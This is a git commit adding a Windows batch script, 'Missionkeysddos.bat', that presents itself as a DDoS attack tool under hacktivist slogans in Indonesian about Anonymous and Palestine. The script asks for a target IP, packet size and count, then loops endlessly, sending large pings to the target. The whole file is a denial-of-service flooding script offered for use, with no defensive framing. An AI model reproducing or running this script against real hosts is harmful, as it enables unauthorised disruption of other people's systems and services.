6fb47fe207a2627a9f025ef8b5f099dc776147bc
Thony-gans <75247911+thony-gans@users.noreply.github.com>
2021-11-25 21:44:40 +0700

    Add files via upload

---
+++ Missionkeysddos.bat
@@ -0,0 +1,61 @@
+@echo off
+
+
+) # Wahai Pengguna Gunakan Tools DDoS ini Dengan Bijak Ya!!
+) # Gunakan Tools Ini War Wer Wor Bersama Anonymous Untuk Membantu Palestina
+) # WE
+) # ARE
+) # K3YS
+) # WE
+) # ARE 
+) # LEGION
+) # WE
+) # DONT
+) # FORGIVE
+) # WE 
+) # DONT
+) # FORGET
+) # EXPECT
+) # US
+
+title DDoS Attack Mission 
+:!lin!
+color 0a
+echo:
+echo:
+echo:
+echo:
+echo                      .2hjukdsjsnnjkojd.
+echo         .ewi..da     .eioewoewoieopwqp.      rq..uei.
+echo           390njk     9320jkkjdbfdjkfndk0     oijijs
+echo             jeoji    euw     whud    opl    iwjdkj    
+echo              eiwoj   jis     p  o    wqi   iwoqjj
+echo               wpoop  jkfdebkd    jildjkk  eioewp
+echo                iewoi   eijjiewjiijejep   ewjkdp
+echo                 ewioi     eopewoopo     ioeiji
+echo                   ewji      pwpwqp     wjask
+echo                   [91m[  PBH-XPLOIT BLACKHAT  ]
+echo                   [91m[ creator : S1k3ys      ]
+echo                   [91m[ github  : thony-gans  ]
+echo:                                       
+echo [92mset-input --iptarget  ( ex: 10.0.0.0 )                 
+echo set-input --Packet    ( ex: 1000 )
+echo set-input --Sent      ( ex: 100 )
+echo:
+set /p "ip=[ Ip Target ]=[91m> "
+echo [92m[exec:%ip% ]
+set /p "pack=[ Packet Sent ]=[91m> "
+echo [92m[exec:%pack% ]
+set /p "sent=[ Sent Request ]=[91m> "
+echo [92m
+echo:
+set PSWD=0
+goto START
+:START
+set /A PSWD=%PSWD%+1
+echo [[91m%PSWD%[92m] packet [91m%pack%[92m Target %ip% DDoS Attack Is Running[91m...
+@ping %ip% -l %pack% -n %sent% >nul
+goto START
+
+) # catatan : semakin banyak angka request maka semakin lambat pula berjalannya!!!!!
+) # GAME-OVER 
